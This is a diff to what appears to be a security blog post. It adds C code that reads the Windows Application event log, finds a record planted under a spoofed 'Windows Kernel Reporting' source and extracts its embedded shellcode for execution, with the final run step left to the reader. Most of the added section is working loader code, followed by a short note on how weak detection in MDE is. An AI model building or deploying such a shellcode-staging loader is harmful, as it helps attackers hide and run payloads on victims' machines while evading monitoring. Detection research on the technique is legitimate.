@@ -134,6 +134,121 @@ Build:
 gcc WriteToEventLog.c -o WriteToEventLog.exe
 ```
 
+## Retrieving the embedded data
+
+After the shellcode has been embedded, we need to retrieve it.
+
+The Win32 APIs that are gonna be helpful:
+- `OpenEventLog`
+- `ReadEventLog`
+
+
+`ReadEventLog` returns us a structure that we will be parsing out `EVENTLOGRECORD`(Not gonna paste the structures in the blog to bloat the text lol, you have internet and can click links). Important thing to note is the `SourceName` which is the first field that follows the said structure (See Remarks section of MS docs) - [link](https://learn.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-eventlogrecord)
+
+Obtaining `EventId` requires usd to apply the bitmask `0xFFFF` - it masks out the upper 16 bits, so we get only bits 0 through 15. These bits (Code) hold the actual `EventId`. Ref: [link](https://learn.microsoft.com/en-us/windows/win32/eventlog/event-identifiers).
+
+### Code
+
+```
+#include <windows.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+int main() {
+HANDLE hEventLog = OpenEventLog(NULL, "Application");
+if (hEventLog == NULL) {
+    printf("Failed to open Application Channel. Error: %lu\n", GetLastError());
+    return 1;
+}
+
+DWORD dwBufferSize = 0x1000; 
+PEVENTLOGRECORD pBuffer = (PEVENTLOGRECORD)malloc(dwBufferSize);
+if (!pBuffer) {
+    CloseEventLog(hEventLog);
+    return 1;
+}
+
+DWORD dwBytesRead = 0;
+DWORD dwMinNeeded = 0;
+BOOL bFound = FALSE;
+
+// reads from newest
+while (!bFound) {
+    BOOL bSuccess = ReadEventLog(
+        hEventLog,
+        EVENTLOG_BACKWARDS_READ | EVENTLOG_SEQUENTIAL_READ,
+        0,
+        pBuffer,
+        dwBufferSize,
+        &dwBytesRead,
+        &dwMinNeeded
+    );
+
+    if (!bSuccess) {
+        DWORD dwError = GetLastError();
+        
+        // buffer resize if required
+        if (dwError == ERROR_INSUFFICIENT_BUFFER) {
+            dwBufferSize = dwMinNeeded;
+            PEVENTLOGRECORD pTemp = (PEVENTLOGRECORD)realloc(pBuffer, dwBufferSize);
+            if (!pTemp) {
+                break;
+            }
+            pBuffer = pTemp;
+            continue; // Retry with bigger buff
+        } 
+        else if (dwError == ERROR_HANDLE_EOF) {
+            printf("Failed to find matching event.\n");
+            break;
+        } 
+        else {
+            printf("ReadEventLog failed with error: %lu\n", dwError);
+            break;
+        }
+    }
+
+    // Iterate through all records returned in the current buffer read
+    DWORD dwOffset = 0;
+    while (dwOffset < dwBytesRead) {
+        PEVENTLOGRECORD pRecord = (PEVENTLOGRECORD)((BYTE *)pBuffer + dwOffset);
+        
+        // The SourceName follows the EVENTLOGRECORD structure in memory
+        char *pSourceName = (char *)((BYTE *)pRecord + sizeof(EVENTLOGRECORD));
+
+        // EventID field contains the lower 16 bits of the full event code
+        DWORD dwEventId = pRecord->EventID & 0xFFFF; 
+
+        if (strcmp(pSourceName, "Windows Kernel Reporting") == 0 && dwEventId == 1) {// look for source and id you defined in writing program
+            printf("Found matching record! (Event ID: %lu, Source: %s)\n", dwEventId, pSourceName);
+            
+            if (pRecord->DataLength > 0 && pRecord->DataOffset > 0) {
+
+                BYTE *pData = (BYTE *)pRecord + pRecord->DataOffset;
+                SIZE_T size = pRecord->DataLength;
+                ...
+                /* work with pData and size to execute shellcode with your fav technique */
+                ...
+                }
+                
+            } else {
+                printf("Record found, but contains no binary data.\n");
+            }
+
+            bFound = TRUE;
+            break;
+        }
+
+        dwOffset += pRecord->Length;
+    }
+}
+
+free(pBuffer);
+CloseEventLog(hEventLog);
+return 0;
+}
+```
+
 ## MDE POV
 
 By executing and checking the events generated within MDE, you will find your usual process execution events and that's it.
@@ -142,4 +257,9 @@ I guess for this you are only relying on your "rare executable/processes" kind o
 
 Obviously, there are `Application` channel events that are generated <- these are rarely being collected, the idea would be to check for weird looking events with embedded binary data. The amount of noise events you will get is enormous. Thus I do not believe that there are good options to detect the activity at this level.
 
-If someone has used this as persistence meechanism, the detection opportunity would be around the method -> Windows Service, Scheduled task etc. Sorry I cannot give you more, but there is literally not much you can do.
+If someone has used this as persistence mechanism, the detection opportunity would be around the method -> Windows Service, Scheduled task etc. Sorry I cannot give you more, but there is literally not much you can do.
+
+In terms of retrieving the event and executing it, again, there is no telemetry that would indicate retrieival of the data from events, you need to "shift more to the right" and focus on the following activities (beacon activity from rare process etc).
+
+
+EOF
